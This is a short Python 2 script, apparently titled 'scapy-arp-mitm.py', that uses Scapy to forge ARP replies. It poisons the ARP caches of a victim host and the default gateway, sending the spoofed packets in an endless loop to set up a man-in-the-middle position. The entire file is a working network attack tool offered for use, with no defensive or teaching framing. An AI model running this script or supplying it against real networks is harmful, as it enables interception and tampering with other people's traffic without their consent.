#!/usr/bin/env python

import sys, time, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
logging.getLogger("scapy.runtime").setLevel(logging.WARNING)

def create_packet(src_ip, dst_ip, iface):
	packet = ARP()
	packet.psrc = src_ip
	packet.pdst = dst_ip
	packet.hwsrc = get_if_hwaddr(iface)
	return packet

def get_default_gateway_ip(iface):
	try:
		return [x[2] for x in scapy.all.conf.route.routes if x[3] == iface and x[2] != '0.0.0.0'][0]
	except IndexError:
		print "Error: Network interface '%s' not found!" % interface
		return False

if len(sys.argv) < 2:
	print "Usage: ./scapy-arp-mitm.py victim_ip [iface (default eth0)]"
	print "Make sure you have packet forwarding enabled!"
	sys.exit(0)

if len(sys.argv) < 3:
	interface = "eth0"
else:
	interface = sys.argv[2]

gateway = get_default_gateway_ip(interface)

if not gateway:
	sys.exit(1)

to_victim = create_packet(gateway, sys.argv[1], interface)
to_gateway = create_packet(sys.argv[1], gateway, interface)
print interface, gateway

while 1:
	send(to_victim, verbose=0)
	send(to_gateway, verbose=0)
	time.sleep(1)
